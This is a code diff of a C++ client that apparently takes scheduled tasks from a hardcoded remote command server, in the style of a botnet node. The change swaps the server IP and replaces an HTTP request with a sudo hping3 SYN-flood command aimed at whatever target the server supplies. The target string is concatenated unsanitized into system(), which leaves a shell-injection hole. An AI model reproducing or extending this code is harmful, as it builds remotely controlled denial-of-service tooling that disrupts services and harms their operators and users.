@@ -15,13 +15,13 @@
 #include <sys/select.h>
 #include <map>
 #include <vector>
+#include <cstdlib>
 
 using namespace std;
 
 #define PORT 5000
 // #define HOST "127.0.0.1"
-// #define HOST "192.168.1.77"
-#define HOST "44.226.145.213"
+#define HOST "176.79.103.88"
 
 enum COMMANDS { ADD, EXEC, TERMINATE };
 string COMMANDS_TAGS [] = { "ADD", "EXEC", "TERMINATE" };
@@ -197,7 +197,16 @@ public:
         int delay = difftime(seconds, now);
         std::cout << "Delay: " << delay << " seconds.\n" << "Duration: " << task.duration << " seconds." << std::endl;
 
-        function<void()> fun = [&]() { http.make_request(task.url); };
+        function<void()> fun = [&]() { 
+            // http.make_request(task.url);
+            std::string command = "sudo hping3 -d 200 -p 80 -S --flood " + task.url;
+            int result = system(command.c_str());
+            if (result == 0) {
+                std::cout << "200, OK" << std::endl;
+            } else {
+                std::cout << "BAD request." << std::endl;
+            }
+        };
         scheduler.schedule(fun, delay);
 
         this_thread::sleep_for(chrono::seconds(task.duration));
